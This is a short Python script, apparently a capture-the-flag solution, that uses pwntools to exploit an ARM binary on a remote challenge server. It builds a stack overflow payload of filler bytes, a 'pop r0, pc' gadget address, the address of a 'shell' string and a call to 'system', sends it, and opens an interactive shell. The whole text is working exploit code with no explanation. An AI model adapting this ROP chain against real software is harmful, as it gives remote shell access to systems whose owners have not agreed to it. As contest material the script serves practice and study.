from pwn import *
import struct

p = remote("0.cloud.chals.io", 21744)
#p = process("qemu-arm -L /usr/arm-linux-gnueabihf/ /home/user/chal", shell=True)
#p = process("/home/user/chal")
e = ELF("/home/user/chal")
#e = ELF("./wARMup")

POP_R0_PC = 0x0001061d

payload = b"Y"
payload += b"A"*3
payload += b"B"*4
payload += b"C"*4
payload += p32(POP_R0_PC)
payload += p32(e.symbols['shell'])
payload += p32(0)
payload += p32(0)
payload += p32(e.symbols['system'])

p.sendline(payload)
p.interactive()
